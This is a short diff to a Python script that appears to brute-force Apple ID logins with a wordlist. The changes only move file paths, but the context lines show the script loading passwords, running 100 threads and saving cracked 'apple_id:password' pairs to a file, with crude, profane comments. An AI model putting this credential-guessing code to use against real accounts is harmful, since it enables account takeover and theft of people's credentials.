@@ -41,7 +41,7 @@ def getConfig():
 		#IF IT'S STATIC JUST DEFINE IT AS SUCH. NO NEED TO TRY AND SHOW OFF YOUR XML TREE PARSING WIZARDRY WITH
 		#CRAZY ONE-LINERS LIKE "$xml = simplexml_load_string($plist);"
 		#fuckin' haxors, man. I tell ya hwat.
-		f = open("files/config.plist","w")
+		f = open("config.plist","w")
 		f.write(config)
 		f.close()
 		print "We just fetched the ever-loving shit out of the config file because who the fuck knows why"
@@ -76,7 +76,7 @@ def doLogin(payload):
 	if response.status_code == 200:
 		if "delegates" in response.content:
 			print "1337 Hacking Success! %s:%s" % (apple_id, password)
-			gs = open("files/government_secrets.txt","w")
+			gs = open("government_secrets.txt","w")
 			gs.write("\n%s:%s" % (apple_id, password))
 			gs.close()
 		else:
@@ -106,8 +106,8 @@ if __name__ == "__main__":
 	getConfig() #Not sure why the original PoC guy is even doing this...
 	
 	#LOAD DA LISTSSSSS
-	wordlist = open("files/wordlist.txt","r").read().split("\n")
-	blank_payload = open("files/blank_payload.plist","r").read()
+	wordlist = open("wordlist.txt","r").read().split("\n")
+	blank_payload = open("blank_payload.plist","r").read()
 	
 	thread_count = 100
 	
